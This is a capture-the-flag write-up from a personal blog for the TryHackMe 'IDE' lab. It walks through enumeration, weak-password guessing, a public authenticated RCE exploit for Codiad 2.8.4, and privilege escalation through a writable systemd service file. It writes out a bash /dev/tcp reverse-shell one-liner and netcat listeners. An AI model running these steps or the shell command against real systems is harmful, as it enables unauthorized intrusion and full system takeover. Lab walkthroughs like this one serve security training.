<!DOCTYPE html><html><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width,initial-scale=1"><title>IDE - THM | Infomation Security - Blog</title><meta name="description" content="Summary
    "><meta http-equiv="cache-control" content="max-age=29030400"><meta http-equiv="pragma" content="public"><meta name="keywords" content=""><meta name="author" content="Jay Nguyen"><meta http-equiv="Content-Language" content="en"><meta property="og:locale" content="en"><meta property="og:site_name" content="Infomation Security"><meta property="og:type" content="WebSite"><meta property="og:url" content="https://jayngng.github.io/blog/ide-thm/"><meta property="og:description" content="
    Blog"><meta property="og:title" content="IDE - THM
  "><link rel="canonical" href="https://jayngng.github.io/blog/ide-thm/"><link type="application/atom+xml" rel="alternate" title="Infomation Security" href="https://jayngng.github.io/feed.xml"><link rel="icon" type="image/png" sizes="32x32" href="https://jayngng.github.io/assets/images/favicon/favicon-32x32.png"><link href="https://fonts.googleapis.com/css?family=Special+Elite" rel="stylesheet"><script defer="defer" src="https://use.fontawesome.com/releases/v5.0.6/js/all.js"></script><link rel="stylesheet" href="https://jayngng.github.io/assets/css/bootstrap.css"><link rel="stylesheet" href="https://jayngng.github.io/assets/css/jektify.css"><link rel="stylesheet" href="https://jayngng.github.io/assets/css/whiteglass.css"></head><body class="body underline_links" id="top"><div class="container layout_default"><div class="row"><div class="col-lg-3 px-0 mt-0 sidebar"><div class="py-3 sticky-top flex-grow-1"><div class="pt-3 sidebar__wrapper"><div class="nav flex-lg-column mx-3 mx-lg-0"><div class="d-none d-sm-block sidebar__avatar_flip"><div class="sidebar__avatar_flip-card"><a class="sidebar__avatar_flip-front sidebar__avatar_flip-face" href="https://jayngng.github.io/"><img class="p-1 img-fluid mx-auto d-block animation__pulse sidebar_avatar_circle sidebar_avatar_background sidebar_avatar_border image_avatar" src="/assets/images/avatar/author.jpg" alt="Avatar"> </a><a class="sidebar__avatar_flip-back sidebar__avatar_flip-face" href="https://jayngng.github.io/"><img class="p-1 img-fluid mx-auto d-block animation__pulse sidebar_avatar_circle sidebar_avatar_background sidebar_avatar_border image_avatar" src="/assets/images/avatar/athor_m.png" alt="Avatar"></a></div></div><h1 class="p-2 text-center d-md-flex align-items-center mx-auto animation__sidebar-title sidebar__title"><a href="https://jayngng.github.io/" class="nav-link" style="font-size: 2.3rem">whoami</a></h1><div class="p-2 mx-3 d-md-flex flex-md-column align-items-md-start align-items-center align-items-lg-start flex-lg-column mx-auto mr-lg-3 ml-lg-3 sidebar__menu animation__sidebar-menu"><div class="my-1 d-none d-md-block mr-3 sidebar__menu-title">Menu: Blog</div><li class="mr-3 mr-lg-0 float-left float-lg-none sidebar__menu-item"><i class="mr-1 fas fa-edit"></i> <a class="sidebar__menu-link" href="https://jayngng.github.io/blog/">Blog</a></li><li class="mr-3 mr-lg-0 float-left float-lg-none sidebar__menu-item"><i class="mr-1 fas fa-tags"></i> <a class="sidebar__menu-link" href="https://jayngng.github.io/blog/tags/">Tags</a></li><li class="mr-3 mr-lg-0 float-left float-lg-none sidebar__menu-item"><i class="mr-1 fas fa-search"></i> <a class="sidebar__menu-link" href="https://jayngng.github.io/blog/search/">Search</a></li></div></div></div></div></div><div class="col-lg-9 p-0 py-4 content" id="main"><div class="px-3 mt-lg-0 layout_post animation__content" itemscope itemtype="http://schema.org/BlogPosting"><div class="p-0 p-lg-3 mb-4 layout_post__header"><h1 class="font-weight-bold layout_post__title">IDE - THM</h1><div class="layout_post__date"><time class="layout_post__time"><i class="far fa-calendar-alt"></i> October 19, 2021</time></div><div class="layout_post__tags"><i class="fa fa-tags"></i>&nbsp;Tags:&nbsp; | <a class="layout_post__tags-link" href="https://jayngng.github.io/blog/tags//webapp">webapp</a> | <a class="layout_post__tags-link" href="https://jayngng.github.io/blog/tags//red">red</a> | <a class="layout_post__tags-link" href="https://jayngng.github.io/blog/tags//thm">thm</a> |</div><div class="layout_post__reading_time"><i class="far fa-clock"></i> Read this in "about 7 minutes".</div></div><div class="p-0 p-lg-3 mb-4 layout_post__content"><div class="d-block"><div class="py-3 row"><div class="offset-6 col-6 offset-sm-9 col-sm-3 offset-lg-10 col-lg-2"></div></div><h2 id="summary"><strong>Summary</strong></h2><p>In this box, we’ll exploit a vulnerable web application running on a <strong>higher port</strong> to retain an initial access on the target system. Enumerating target’s system locally divulges a plaintext password of <code class="language-plaintext highlighter-rouge">drac</code> - a lcoal user. Privilege escalation is achieved via a misconfigured <code class="language-plaintext highlighter-rouge">.service</code> file.</p><hr><p><br></p><h2 id="enumeration"><strong>Enumeration</strong></h2><h4 id="nmap"><strong>Nmap</strong></h4><p>Let’s begin with a <code class="language-plaintext highlighter-rouge">nmap</code> scan.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">--open</span> <span class="nt">-sV</span> <span class="nt">-A</span> <span class="nt">-p-</span> <span class="nt">-vv</span> <span class="nt">-n</span> <span class="nt">-Pn</span> <span class="nt">-oN</span> nmap/services <span class="nv">$IP</span>
</code></pre></div></div><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT      STATE SERVICE REASON         VERSION
21/tcp    open  ftp     syn-ack ttl 61 vsftpd 3.0.3
|_ftp-anon: Anonymous FTP login allowed <span class="o">(</span>FTP code 230<span class="o">)</span>
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.4.1.61
|      Logged <span class="k">in </span>as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session <span class="nb">timeout </span><span class="k">in </span>seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp    open  ssh     syn-ack ttl 61 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
80/tcp    open  http    syn-ack ttl 61 Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
| http-methods:
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Apache2 Ubuntu Default Page: It works
62337/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
|_http-favicon: Unknown favicon MD5: B4A327D2242C42CF2EE89C623279665F
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS 
|_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span> 
|_http-title: Codiad 2.8.4
</code></pre></div></div><p>There are a few opened services. We will start with <code class="language-plaintext highlighter-rouge">FTP</code>.</p><p><br></p><h4 id="ftp-enumeration"><strong>FTP Enumeration</strong></h4><p>With the credentials <code class="language-plaintext highlighter-rouge">anonymous:anonymous</code>, we successfully logged in as <code class="language-plaintext highlighter-rouge">anonymous</code> user.</p><p>Listing all the shares, the <code class="language-plaintext highlighter-rouge">...</code> directory stands out the most interesting to us.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ftp&gt; <span class="nb">ls</span> <span class="nt">-al</span>
200 PORT <span class="nb">command </span>successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 0        114          4096 Jun 18 06:10 <span class="nb">.</span>
drwxr-xr-x    3 0        114          4096 Jun 18 06:10 ..
drwxr-xr-x    2 0        0            4096 Jun 18 06:11 ...
226 Directory send OK.
ftp&gt; <span class="nb">cd</span> ...
250 Directory successfully changed.
</code></pre></div></div><p>Navigating to the directory and listing shares again, we notice a suspicious-looking file <code class="language-plaintext highlighter-rouge">-</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ftp&gt; <span class="nb">ls</span> <span class="nt">-al</span>
200 PORT <span class="nb">command </span>successful. Consider using PASV.
150 Here comes the directory listing.
<span class="nt">-rw-r--r--</span>    1 0        0             151 Jun 18 06:11 -
drwxr-xr-x    2 0        0            4096 Jun 18 06:11 <span class="nb">.</span>
drwxr-xr-x    3 0        114          4096 Jun 18 06:10 ..
226 Directory send OK.
</code></pre></div></div><p>Download it with <code class="language-plaintext highlighter-rouge">get \-</code>. Here is it’s content:</p><div class="language-md highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Hey john,                                                                          
I have reset the password as you have asked. Please use the default password to log
in.                                                                                
Also, please take care of the image file ;)                                        
<span class="p">-</span> drac.
</code></pre></div></div><p>It appears that <code class="language-plaintext highlighter-rouge">john</code> and <code class="language-plaintext highlighter-rouge">drac</code> are potential users in the target system.</p><p>There are two <code class="language-plaintext highlighter-rouge">HTTP</code> services from the earlier scan. Within the scope of this writeup, we drop our attention on the “<code class="language-plaintext highlighter-rouge">62337</code>”.</p><p><br></p><h4 id="http-port-62337"><strong>HTTP port 62337</strong></h4><p>Navigate to the site, we discovered the website is running <code class="language-plaintext highlighter-rouge">Codiad v2.8.4</code></p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl http://10.10.190.116:62337
</code></pre></div></div><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>                                            1 ⚙ 
&lt;<span class="o">!</span>doctype html&gt;                                                                    
                                                                                   
&lt;<span class="nb">head</span><span class="o">&gt;</span>                                                                             
    &lt;meta <span class="nv">charset</span><span class="o">=</span><span class="s2">"utf-8"</span><span class="o">&gt;</span>                                                         
    &lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">"viewport"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"width=device-width, initial-scale=1"</span><span class="o">&gt;</span>           
    &lt;title&gt;Codiad 2.8.4&lt;/title&gt; 
...[snip]...
</code></pre></div></div><p>Conducting a quick research, <code class="language-plaintext highlighter-rouge">Codiad 2.8.4</code> is known to be vulnerable to <strong>Authenticated Remote Code Execution</strong>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>searchsploit codiad                                                    1 ⨯ 1 ⚙
<span class="nt">-------------------------------------------------</span> <span class="nt">---------------------------------</span>
 Exploit Title                                   |  Path
<span class="nt">-------------------------------------------------</span> <span class="nt">---------------------------------</span>
...[snip]...

Codiad 2.8.4 - Remote Code Execution <span class="o">(</span>Authenticated<span class="o">)</span> | multiple/webapps/49705.py

...[snip]...
<span class="nt">-------------------------------------------------</span> <span class="nt">---------------------------------</span>
</code></pre></div></div><hr><p><br></p><h2 id="exploitation"><strong>Exploitation</strong></h2><h4 id="weak-password"><strong>Weak Password</strong></h4><p>Recalling the <code class="language-plaintext highlighter-rouge">-</code> file, which reveals <code class="language-plaintext highlighter-rouge">john</code> and <code class="language-plaintext highlighter-rouge">drac</code> users, we then attempt to guess weak and common passwords against those users.</p><p>For instance, such passwords: <code class="language-plaintext highlighter-rouge">admin</code>, <code class="language-plaintext highlighter-rouge">password</code>, <code class="language-plaintext highlighter-rouge">root</code>, <code class="language-plaintext highlighter-rouge">toor</code> can be good candidates.</p><p>After finding out the correct credentials, we can start exploiting the vulnerability that we’ve discovered earlier.</p><p><br></p><h4 id="codiad-284-authenticated-rce"><strong>Codiad 2.8.4 Authenticated RCE</strong></h4><p>Steps to reproduce the attack:</p><ul><li>1. Copy the exploit to current working directory.</li></ul><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>searchsploit <span class="nt">-m</span> multiple/webapps/49705.py
</code></pre></div></div><ul><li>2. On the 1st terminal, we execute the following command:</li></ul><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python3 49705.py http://<span class="nv">$IP</span>:62337/ <span class="nv">$USER</span> <span class="nv">$PASSWORD</span> <span class="nv">$LIP</span> <span class="nv">$LPORT</span> linux
<span class="o">[</span>+] Please execute the following <span class="nb">command </span>on your vps: 

...[snip]...

<span class="o">[</span>+] Please confirm that you have <span class="k">done </span>the two <span class="nb">command </span>above <span class="o">[</span>y/n]
<span class="o">[</span>Y/n] Y <span class="c"># Please finish steps 3 &amp; 4 before pressing Y </span>
</code></pre></div></div><ul><li>3. On the 2nd terminal, we continue executing:</li></ul><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'bash -c "bash -i &gt;/dev/tcp/$LIP/$LPORT+1 0&gt;&amp;1 2&gt;&amp;1"'</span> | nc <span class="nt">-lnvp</span> <span class="nv">$LPORT</span>
<span class="c"># if $LPORT is 9001, $LPORT+1 is 9002</span>
</code></pre></div></div><ul><li>4. On the 3rd terminal, we set up a <code class="language-plaintext highlighter-rouge">nc</code> listener:</li></ul><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nc <span class="nt">-nlvp</span> <span class="nv">$LPORT</span>+1
</code></pre></div></div><p>After entering <code class="language-plaintext highlighter-rouge">Y</code>, our <code class="language-plaintext highlighter-rouge">nc</code> should catch a reverse shell as <code class="language-plaintext highlighter-rouge">www-data</code> after a few seconds.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nc <span class="nt">-lnvp</span> 9002
</code></pre></div></div><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>listening on <span class="o">[</span>any] 9002 ...
connect to <span class="o">[</span>10.4.1.61] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.190.116] 60068
bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>971<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
bash: no job control <span class="k">in </span>this shell
www-data@ide:/var/www/html/codiad/components/filemanager<span class="nv">$ </span><span class="nb">id
id
</span><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
</code></pre></div></div><hr><p><br></p><h2 id="privilege-escalation"><strong>Privilege Escalation</strong></h2><h4 id="plaintext-password"><strong>Plaintext Password</strong></h4><p>Enumerating the target system exposed a password of user <code class="language-plaintext highlighter-rouge">drac</code>, stored in the <code class="language-plaintext highlighter-rouge">/home/drac/.bash_history</code> file.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@ide:/var/www/html/codiad/components/filemanager<span class="nv">$ </span><span class="nb">cat</span> /home/drac/.bash_history
&lt;omponents/filemanager<span class="nv">$ </span><span class="nb">cat</span> /home/drac/.bash_history      
mysql <span class="nt">-u</span> drac <span class="nt">-p</span> <span class="s1">'Th[REDACTED]3aL'</span>
</code></pre></div></div><p>Using the newly obtained credentials, we logged in as <code class="language-plaintext highlighter-rouge">drac</code>.</p><p><br></p><h4 id="system-compromised"><strong>System Compromised</strong></h4><p>Further enumeration reveals that <code class="language-plaintext highlighter-rouge">drac</code> can run <code class="language-plaintext highlighter-rouge">sudo</code> command …</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>drac@ide:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
</code></pre></div></div><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>drac: 
Matching Defaults entries <span class="k">for </span>drac on ide:
    env_reset, mail_badpass,
    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin

User drac may run the following commands on ide:
    <span class="o">(</span>ALL : ALL<span class="o">)</span> /usr/sbin/service vsftpd restart
</code></pre></div></div><p>Besides, <code class="language-plaintext highlighter-rouge">drac</code> can also write into the <code class="language-plaintext highlighter-rouge">vsftpd.service</code> file.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>drac@ide:~<span class="nv">$ </span>find / <span class="nt">-writable</span> <span class="nt">-name</span> vsftpd<span class="k">*</span> <span class="nt">-type</span> f <span class="nt">-ls</span> 2&gt;/dev/null<span class="p">;</span>
   282032      4 <span class="nt">-rw-rw-r--</span>   1 root     drac          248 Aug  4 07:24 /lib/systemd/system/vsftpd.service
</code></pre></div></div><p>To successfully pull a reverse shell, we need to modify the <code class="language-plaintext highlighter-rouge">.service</code> file. There are various ways to do it, the below is one example:</p><div class="row imager__plugin"><img class="img-fluid mx-auto d-block" src="/assets/images/posts/ide_thm/1.png" title="ide_thm/1.png" alt="ide_thm/1.png"></div><p>After the file was modified, we’ll setup a <code class="language-plaintext highlighter-rouge">nc</code> listener and restart the daemon &amp; service …</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>drac@ide:~<span class="nv">$ </span>systemctl daemon-reload                                                         
<span class="o">====</span> AUTHENTICATING FOR org.freedesktop.systemd1.reload-daemon <span class="o">===</span>
Authentication is required to reload the systemd state.
Authenticating as: drac
Password: 
<span class="o">====</span> AUTHENTICATION COMPLETE <span class="o">===</span>
drac@ide:~<span class="nv">$ </span><span class="nb">sudo</span> /usr/sbin/service vsftpd restart
</code></pre></div></div><p>Our <code class="language-plaintext highlighter-rouge">nc</code> should now spawn a shell as <code class="language-plaintext highlighter-rouge">root</code>!.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nc <span class="nt">-nlvp</span> 9001
listening on <span class="o">[</span>any] 9001 ...
connect to <span class="o">[</span>10.4.1.61] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.190.116] 56810
bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>3364<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
bash: no job control <span class="k">in </span>this shell
root@ide:/# <span class="nb">id 
id
</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
</code></pre></div></div><center><script src="https://tryhackme.com/badge/44696"></script></center></div></div><div class="p-0 p-lg-3 mb-4 layout_post__footer"></div></div></div></div></div><div class="py-1 position-fixed fixed-bottom w-100 footer"><div class="container-fluid"><div class="row"><div class="text-center col-12 col-md-4"><span class="footer__copyright">Infomation Security © 2021-2023 • All right reserved.</span></div><div class="text-center col-12 col-md-4 d-none d-md-block"><span class="footer__message">Simplicity is fashionable.</span></div><div class="text-center col-12 col-md-4"><span class="footer__madeby">Made with&nbsp;<a href="https://jekyllrb.com" target="_blank">Jekyll</a>&nbsp;using&nbsp;<a href="https://github.com/williamcanin/typing-jekyll-template" target="_blank">Typing</a>&nbsp;Theme.</span></div></div></div></div><div class="d-block d-lg-none position-fixed fixed-bottom w-100 scrolltop"><div class="float-right mr-3 scrolltop__wrapper"><a class="mr-3 scrolltop__button" href="#top"><i class="fas fa-caret-up"></i></a></div></div><script type="text/javascript" src="https://jayngng.github.io/assets/vendor/js/jquery.min.js"></script><script type="text/javascript" src="https://jayngng.github.io/assets/vendor/js/popper.min.js"></script><script type="text/javascript" src="https://jayngng.github.io/assets/vendor/js/bootstrap.min.js"></script><script type="text/javascript" src="https://jayngng.github.io/assets/vendor/js/simple-jekyll-search.min.js"></script><script type="text/javascript" src="https://jayngng.github.io/assets/js/global.js"></script><script type="text/javascript" src="https://jayngng.github.io/assets/js/post.js"></script><script src="https://jayngng.github.io/assets/vendor/jektify/js/jektify.min.js"></script></body><script id="dsq-count-scr" src="https://.disqus.com/count.js" async></script></html>